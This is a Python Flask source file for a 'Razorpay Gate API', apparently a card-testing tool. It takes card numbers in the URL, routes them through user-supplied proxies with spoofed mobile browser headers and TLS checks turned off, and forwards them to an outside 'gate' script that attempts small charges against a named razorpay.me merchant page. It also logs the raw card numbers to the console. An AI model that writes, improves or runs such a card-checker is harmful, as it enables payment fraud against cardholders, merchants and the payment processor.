from flask import Flask, request, jsonify
import requests
import json
import re
from datetime import datetime

app = Flask(__name__)

GATE_URL = "https://mydom.arpitchk.shop/autorz.php/"

# Exact headers from your working request
HEADERS = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
}

@app.route('/gate=rz/cc=<card>', methods=['GET'])
def gate(card):
    proxy = request.args.get('proxy')
    if not proxy:
        return jsonify({"status": "error", "message": "proxy parameter required"}), 400

    # Clean proxy (allow with or without http://)
    clean_proxy = proxy.replace("http://", "").replace("https://", "")

    # Build exact URL (proxy in URL + proxy auth in requests)
    url = f"{GATE_URL}?cc={card}&url=https://razorpay.me/@ukinternational&proxy=http://{clean_proxy}&amount=100"

    proxies = {
        "http": f"http://{clean_proxy}",
        "https": f"http://{clean_proxy}"
    }

    try:
        response = requests.get(
            url,
            headers=HEADERS,
            proxies=proxies,
            timeout=40,
            verify=False
        )

        # LOG FULL RAW RESPONSE
        print("\n" + "="*60)
        print(f"TIME   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"CARD   : {card}")
        print(f"PROXY  : {clean_proxy}")
        print(f"STATUS : {response.status_code}")
        print("RAW RESPONSE:")
        print(response.text)
        print("="*60 + "\n")

        # Extract JSON block from HTML
        json_match = re.search(r'\{.*"credit".*?\}', response.text, re.DOTALL)
        if json_match:
            data = json.loads(json_match.group())
            return jsonify({
                "status": data.get("status", "unknown"),
                "message": data.get("message", "No message from gate")
            })

        # Fallback
        return jsonify({
            "status": "failed",
            "message": "No JSON found in response"
        })

    except Exception as e:
        print(f"ERROR  : {str(e)}")
        return jsonify({"status": "gateway_error", "message": "Proxy or connection failed"})

if __name__ == '__main__':
    print("Razorpay Gate API Running...")
    print("Endpoint: /gate=rz/cc=CARD?proxy=user:pass@ip:port")
    app.run(host='0.0.0.0', port=5000)
